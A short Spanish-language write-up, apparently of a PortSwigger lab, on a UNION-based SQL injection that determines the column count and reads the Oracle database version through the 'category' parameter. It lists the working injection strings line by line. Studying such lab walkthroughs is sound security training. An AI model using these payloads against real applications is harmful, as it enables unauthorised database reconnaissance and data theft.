
https://portswigger.net/web-security/sql-injection/cheat-sheet

- Se intercepta la solicitud que filtra los productos por categoría y se modifica el parámetro ‘category’.
- Primero se determina cuántas columnas devuelve la consulta y cuáles aceptan datos de tipo texto. Esto es necesario para que el ataque UNION funcione correctamente.
- Una vez identificadas las columnas, se utiliza una inyección que consulta la tabla ‘v$version’, propia de Oracle, para obtener el valor del campo ‘BANNER’, que contiene información sobre la versión de la base de datos.


+ Primero debemos de buscar el total de columnas existentes que nos muestra la Web
    + ' order by 10-- -
    + ' order by 5-- -
    + ' order by 2-- -
    * ' union select NULL,NULL-- -
    * ' union select NULL,NULL from dual-- -
    * Corporate+gifts' union select banner,NULL from v$version-- -

**Quédate con esto**: El ataque UNION es útil para extraer datos arbitrarios de la base de datos, y conocer el motor y versión es fundamental para planificar un ataque eficaz.